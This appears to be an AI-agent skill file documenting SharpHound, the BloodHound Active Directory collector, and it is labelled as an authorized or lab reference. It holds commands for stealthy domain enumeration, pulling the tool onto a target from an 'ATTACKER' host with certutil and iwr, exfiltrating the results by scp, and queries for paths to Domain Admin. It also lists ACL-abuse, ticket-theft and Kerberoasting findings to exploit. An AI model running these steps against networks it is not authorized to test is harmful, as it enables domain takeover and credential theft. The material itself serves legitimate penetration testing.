---
name: sharphound
description: "Auth/lab ref: BloodHound data collector that gathers Active Directory domain structure, users, groups, computers, ACLs, and testing paths."
license: GPL-3.0
compatibility: "Windows."
metadata:
  author: AeonDave
  version: "1.1"
---

# SharpHound

BloodHound data collector — gathers AD domain structure, users, groups, ACLs, and attack paths for visualization.

## Quick Start

```cmd
# Basic collection (all data)
SharpHound.exe -c All

# Stealth collection (DC data only)
SharpHound.exe -c DCOnly

# Collection with output
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\

# Specify domain
SharpHound.exe -d corp.local -c All

# Use specific DC
SharpHound.exe -d corp.local --domaincontroller dc.corp.local -c All
```

## Collection Flags

| Flag | Purpose |
|---|---|
| `-c All` | Collect all data types (users, computers, groups, ACLs, GPOs, containers, domains, trusts) |
| `-c DCOnly` | Domain Controller data only (minimal, stealth) |
| `-c Session` | Collect session/logon data (noisy!) |
| `-c LocalAdmin` | Local group membership on computers |
| `-c RDP` | Remote Desktop session data |
| `-c DCOM` | DCOM object access data |
| `-c PSRemote` | PowerShell remoting access |
| `-c ObjectProps` | User/group properties (description, notes) |
| `-c ACL` | ACL data (critical for paths) |
| `-c Group` | Group memberships and descriptions |
| `--outputdirectory <path>` | Output location |
| `-d <domain>` | Target domain |
| `--domaincontroller <ip>` | Specific DC IP |
| `--ldapusername <user>` | LDAP authentication |
| `--ldappassword <pass>` | LDAP password |
| `-k` | Use Kerberos (ticket-based auth) |
| `--no-color` | Disable colored output |
| `--throttle <n>` | LDAP throttling (in ms) |
| `--jitter <n>` | Add jitter to timing |
| `--loop` | Run continuously (timed interval) |

## Collection Strategies

### Stealth Collection (minimal detectable)

```cmd
# DC only, no session collection
SharpHound.exe -c DCOnly --throttle 2000 --jitter 25
```

### Full Recon (more data, noisier)

```cmd
# Everything
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\
```

### Low-Privilege User Collection

```cmd
# From non-admin account (less data, but valuable)
SharpHound.exe -c All -d corp.local
```

### Compromised Credentials

```cmd
# As different user (if you have creds)
SharpHound.exe -c All -d corp.local --ldapusername "corp\attacker" --ldappassword "password"
```

## Output

SharpHound generates **ZIP file** with JSON files:

```
<timestamp>_BloodHound.zip
├── computers.json       # Computer data
├── users.json          # User data
├── groups.json         # Group memberships
├── ous.json            # Organizational Units
├── domains.json        # Domain relationships
├── gpos.json           # Group Policy Objects
├── containers.json     # Container data
├── trusts.json         # Inter-domain trusts
├── ace.json            # ACLs (critical)
└── sessions.json       # Logon sessions (if collected)
```

## Workflow

### 1. Collect from Linux / Compromised Host

```bash
# Transfer SharpHound.exe to target
python3 -m http.server 80

# On target (Windows)
certutil -urlcache -split -f http://ATTACKER/SharpHound.exe C:\Windows\Temp\SharpHound.exe
# or
iwr -Uri http://ATTACKER/SharpHound.exe -OutFile C:\Windows\Temp\SharpHound.exe
```

### 2. Execute Collection

```cmd
C:\Windows\Temp\SharpHound.exe -c All --outputdirectory C:\Windows\Temp\
```

### 3. Exfiltrate ZIP

```bash
# From Linux, pull the ZIP
scp user@target:C:\Windows\Temp\*.zip ./

# Or HTTP exfil
# (requires web server on target, risky)
```

### 4. Import to BloodHound GUI

```bash
# Start BloodHound Neo4j & GUI
/path/to/BloodHound

# Drag & drop ZIP into BloodHound
# OR
# Click "Upload Data" → Select ZIP file
```

### 5. Run Queries

```cypher
-- Shortest path to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

-- High-value targets
MATCH (u:User {admincount:true}) RETURN u.name

-- Unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

## Key Data Collected

| Data Type | Critical Info |
|---|---|
| **Users** | AdminCount, ServicePrincipalName (Kerberoastable), lastPassword Changed |
| **Groups** | Domain Admins, Enterprise Admins, Schema Admins, Account Operators |
| **Computers** | OS, lastLogon, unconstrainedDelegation, trustedToAuth (constrained delegation) |
| **ACLs** | AllExtendedRights, GenericAll, WriteProperty, WriteDacl (attack surface!) |
| **Trusts** | Inter-domain trusts, direction, transitivity (lateral domain movement) |
| **Sessions** | Where admins are logged in (targets for token theft) |

## Performance & Stealth

- **`-c DCOnly`** → Fast, stealth, minimal enumeration
- **`-c All`** → Comprehensive, slower, may trigger alerts
- **`--throttle 2000`** → Add 2000ms delay between LDAP queries (stealth)
- **`--jitter 25`** → Add up to 25% random jitter
- **`--loop`** → Run periodically (e.g., capture new admins logging in)

## BloodHound CE (Community Edition)

```bash
# Docker-based BloodHound alternative (free)
docker run -it --rm -p 7687:7687 -p 7474:7474 specterops/bloodhound:latest

# Access at http://localhost:7474
# Default: admin / password
```

## Integration

| Tool | Integration |
|---|---|
| **BloodHound GUI** | Import ZIP directly |
| **Rubeus** | Use path data to plan Kerberoasting / ticket theft |
| **PowerView** | Verify findings; detailed querying |
| **LDAP tools** | Cross-reference LDAP data |

## Common Findings to Exploit

- **All Extended Rights on user/group** → GenericAll abuse
- **WriteProperty on user** → Password reset, add group member
- **WriteDacl** → Modify ACL, grant yourself rights
- **Unconstrained Delegation** → Monitor & steal TGT from connecting user
- **Kerberoastable Users** → Rubeus roast → crack password

## Resources

| File | When to load |
|---|---|
| `references/` | BloodHound query library, ACL abuse exploits, PowerView equivalents |
